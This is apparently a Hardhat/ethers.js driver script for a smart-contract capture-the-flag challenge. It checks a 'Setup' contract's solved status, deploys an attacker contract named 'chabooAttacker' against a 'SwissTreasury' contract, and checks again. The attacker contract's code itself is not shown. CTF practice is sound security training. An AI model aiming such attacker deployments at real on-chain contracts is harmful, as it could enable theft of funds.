const { parseEther } = require("ethers/lib/utils");
const { setGracefulCleanup } = require("tmp");

async function main() {
  const EXPLOIT = await ethers.getContractFactory("chabooAttacker");

  const setup = await ethers.getContractAt( "Setup", "0x0a73CA730FaF56126487196a4B7E10B2A9B3df67" );
  const ctf = await ethers.getContractAt( "SwissTreasury", "0x014D1921A1237b6e8fF3FA960333329667F7e242" );

  console.log("solved:", await setup.isSolved());

  const exploit = await EXPLOIT.deploy(ctf.address);

  console.log("solved:", await setup.isSolved());
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error);
    process.exit(1);
  });
